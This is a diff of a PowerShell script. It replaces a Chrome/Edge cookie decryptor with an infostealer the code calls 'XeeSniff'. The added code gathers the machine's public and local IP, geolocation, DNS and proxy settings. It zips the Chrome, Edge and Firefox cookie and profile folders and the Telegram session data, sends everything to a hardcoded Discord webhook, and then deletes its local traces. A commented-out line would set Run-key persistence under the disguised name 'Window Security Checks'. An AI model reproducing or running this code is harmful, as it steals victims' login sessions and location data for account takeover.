@@ -1,89 +1,164 @@
-function Get-ChromeMasterKey {
-    param($localStatePath)
+# === CONFIG ===
+$webhook = "https://discord.com/api/webhooks/1374258261922152578/NPsuFh6jP-ZwrZ4hq8fkYmCvGzlEYzZMK3uIZPxYP4-Eg0thnKi-MzxYBQx3whNN4gCl"
+$dumpFolder = "$env:TEMP\XeeDump"
+$scriptPath = $MyInvocation.MyCommand.Path
+Add-Type -AssemblyName System.IO.Compression.FileSystem
 
-    $localStateJson = Get-Content $localStatePath -Raw | ConvertFrom-Json
-    $encryptedKeyBase64 = $localStateJson.os_crypt.encrypted_key
-    $encryptedKey = [Convert]::FromBase64String($encryptedKeyBase64)
-    $encryptedKey = $encryptedKey[5..($encryptedKey.Length - 1)] # Remove DPAPI prefix
+# === AUTOSTART ===
+$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+$regName = "Window Security Checks"
+#Set-ItemProperty -Path $regPath -Name $regName -Value "`"$scriptPath`""
 
-    # Decrypt master key using DPAPI
-    $masterKey = [System.Security.Cryptography.ProtectedData]::Unprotect($encryptedKey, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
-    return $masterKey
+# === PREP ===
+if (-not (Test-Path $dumpFolder)) {
+    New-Item -ItemType Directory -Path $dumpFolder | Out-Null
 }
 
-function Decrypt-ChromeCookie {
-    param($encryptedBytes, $masterKey)
+# === GEO & IP INFO ===
+function Get-IPInfo {
+    try {
+        $ipData = Invoke-RestMethod -Uri "http://ip-api.com/json/?fields=66846719"
+        $hostname = $env:COMPUTERNAME
+        $dnsServers = (Get-DnsClientServerAddress -AddressFamily IPv4 | Select-Object -ExpandProperty ServerAddresses) -join ", "
+        $adapter = Get-NetIPConfiguration | Where-Object { $_.IPv4DefaultGateway -ne $null } | Select-Object -First 1
+        $gateway = $adapter.IPv4DefaultGateway.NextHop
+        $localIP = $adapter.IPv4Address.IPAddress
+        $ieProxy = Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
+        $ieProxyEnabled = $ieProxy.ProxyEnable
+        $ieProxyServer = $ieProxy.ProxyServer
+        $winHttpProxy = netsh winhttp show proxy | Out-String
 
-    if ($encryptedBytes[0..2] -eq [byte[]](0x76, 0x31, 0x30)) { # 'v10' prefix
-        $nonce = $encryptedBytes[3..14]
-        $cipherText = $encryptedBytes[15..($encryptedBytes.Length - 17)]
-        $tag = $encryptedBytes[($encryptedBytes.Length - 16)..($encryptedBytes.Length - 1)]
-
-        $aesGcm = [System.Security.Cryptography.AesGcm]::new($masterKey)
-        $plainBytes = New-Object byte[] $cipherText.Length
-        $aesGcm.Decrypt($nonce, $cipherText, $tag, $plainBytes)
-
-        return [System.Text.Encoding]::UTF8.GetString($plainBytes)
-    } else {
-        return "[Unsupported/Plaintext]"
-    }
+        return @{
+            PublicIP      = $ipData.query
+            Hostname      = $hostname
+            LocalIP       = $localIP
+            Gateway       = $gateway
+            DNS           = $dnsServers
+            Country       = $ipData.country
+            Region        = $ipData.regionName
+            City          = $ipData.city
+            ZIP           = $ipData.zip
+            Lat           = $ipData.lat
+            Lon           = $ipData.lon
+            TimeZone      = $ipData.timezone
+            ISP           = $ipData.isp
+            Org           = $ipData.org
+            AS            = $ipData.'as'
+            ProxyDetected = if ($ipData.proxy -eq $true -or $ieProxyEnabled -eq 1 -or $winHttpProxy -match 'Proxy Server') { "Yes" } else { "No" }
+            ProxySource   = @{
+                APIProxyFlag   = $ipData.proxy
+                IEProxyEnabled = $ieProxyEnabled
+                IEProxyServer  = $ieProxyServer
+                WinHTTPProxy   = $winHttpProxy.Trim()
+            }
+        }
+    } catch {}
 }
 
-function Get-XeeCooCookies {
-    param(
-        [string]$Browser = "Chrome"
+function Send-DiscordEmbed {
+    param (
+        [string]$title,
+        [string]$desc,
+        [string]$filename,
+        [object]$filecontent
     )
 
-    if ($Browser -ieq "Chrome") {
-        $cookiePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies"
-        $localStatePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
-    } elseif ($Browser -ieq "Edge") {
-        $cookiePath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Network\Cookies"
-        $localStatePath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Local State"
-    } else {
-        Write-Error "Unsupported browser: $Browser"
-        return
+    $embed = @{
+        "username" = "XeeSniff"
+        "embeds" = @(@{
+            "title" = $title
+            "description" = $desc
+            "color" = 14423100
+            "footer" = @{ "text" = "XeeTST" }
+        })
     }
 
-    # Copy the cookie DB
-    $tempDb = "$env:TEMP\XeeCoo_Cookies.sqlite"
-    Copy-Item $cookiePath -Destination $tempDb -Force
+    $boundary = [System.Guid]::NewGuid().ToString()
+    $LF = "`r`n"
+    $bodyLines = @()
+    $bodyLines += "--$boundary"
+    $bodyLines += "Content-Disposition: form-data; name=`"payload_json`"$LF$LF"
+    $bodyLines += ($embed | ConvertTo-Json -Depth 10)
+    $bodyLines += "$LF--$boundary"
+    $bodyLines += "Content-Disposition: form-data; name=`"file0`"; filename=`"$filename`"$LF"
+    $bodyLines += "Content-Type: application/octet-stream$LF$LF"
+    $bodyLines += $filecontent
+    $bodyLines += "$LF--$boundary--$LF"
 
-    # Get the master key
-    $masterKey = Get-ChromeMasterKey -localStatePath $localStatePath
+    $body = $bodyLines -join $LF
 
-    # Load SQLite assembly
-    Add-Type -AssemblyName System.Data
-
-    $connStr = "Data Source=$tempDb;Version=3;"
-    $conn = New-Object System.Data.SQLite.SQLiteConnection $connStr
-    $conn.Open()
-
-    $cmd = $conn.CreateCommand()
-    $cmd.CommandText = "SELECT host_key, name, encrypted_value FROM cookies"
-
-    $reader = $cmd.ExecuteReader()
-    while ($reader.Read()) {
-        $host = $reader["host_key"]
-        $name = $reader["name"]
-        $encryptedValue = $reader["encrypted_value"]
-
-        $encBytes = New-Object byte[] $encryptedValue.Length
-        $null = $encryptedValue.Read($encBytes, 0, $encryptedValue.Length)
-
-        try {
-            $decrypted = Decrypt-ChromeCookie -encryptedBytes $encBytes -masterKey $masterKey
-        } catch {
-            $decrypted = "[Decryption Failed]"
-        }
-
-        Write-Output "$host`t$name`t$decrypted"
-    }
-
-    $conn.Close()
-    Remove-Item $tempDb -Force
+    try {
+        Invoke-RestMethod -Uri $webhook -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $body
+    } catch {}
 }
 
-# Example usage
-Get-XeeCooCookies -Browser "Chrome"
-# Get-XeeCooCookies -Browser "Edge"
+$ipInfo = Get-IPInfo
+$Ipdesc = @"
+**Hostname:** $($ipInfo.Hostname)
+**Local IP:** $($ipInfo.LocalIP)
+**Public IP:** $($ipInfo.PublicIP)
+**Default Gateway:** $($ipInfo.Gateway)
+**DNS Servers:** $($ipInfo.DNS)
+
+**Country:** $($ipInfo.Country)
+**Region:** $($ipInfo.Region)
+**City:** $($ipInfo.City)
+**ZIP Code:** $($ipInfo.ZIP)
+**Lat / Lon:** $($ipInfo.Lat), $($ipInfo.Lon)
+**Timezone:** $($ipInfo.TimeZone)
+**ISP:** $($ipInfo.ISP)
+**Org:** $($ipInfo.Org)
+**AS:** $($ipInfo.AS)
+
+**Proxy Detected:** $($ipInfo.ProxyDetected)
+  - **API Flag:** $($ipInfo.ProxySource.APIProxyFlag)
+  - **IE Proxy Enabled:** $($ipInfo.ProxySource.IEProxyEnabled)
+  - **IE Proxy Server:** $($ipInfo.ProxySource.IEProxyServer)
+  - **WinHTTP Proxy:** $($ipInfo.ProxySource.WinHTTPProxy)
+"@
+
+Send-DiscordEmbed -title "IP Information" -desc $Ipdesc -filename "info.txt" -filecontent $Ipdesc
+
+# === BROWSER COOKIE DUMP ===
+$browsers = @{
+    "Chrome"   = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network"
+    "Edge"     = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Network"
+    "Telegram" = "$env:APPDATA\Telegram Desktop\tdata"
+    "FireFox"  = "$env:APPDATA\Mozilla\Firefox\Profiles"
+}
+
+$collectedCookies = @()
+
+foreach ($browser in $browsers.GetEnumerator()) {
+    $shortName = $browser.Key
+    $cookiePath = $browser.Value
+
+    if (Test-Path $cookiePath) {
+        try {
+            $zipPath = Join-Path $dumpFolder "$shortName.zip"
+            [System.IO.Compression.ZipFile]::CreateFromDirectory($cookiePath, $zipPath)
+
+            $bytes = [IO.File]::ReadAllBytes($zipPath)
+
+            $collectedCookies += [PSCustomObject]@{
+                Name      = "$shortName.zip"
+                Path      = $cookiePath
+                LocalCopy = $zipPath
+                Bytes     = $bytes
+                Title     = "$shortName Cookie Dump"
+            }
+        } catch {}
+    } 
+}
+
+if ($collectedCookies.Count -gt 0) {
+    foreach ($item in $collectedCookies) {
+        $desc = "`n**$($item.Name):** $($item.Path)"
+        Send-DiscordEmbed -title $item.Title -desc $desc -filename $item.Name -filecontent $item.Bytes
+    }
+}
+
+# === CLEANUP ===
+try {
+    Remove-Item -Path $dumpFolder -Recurse -Force -ErrorAction SilentlyContinue
+} catch {}
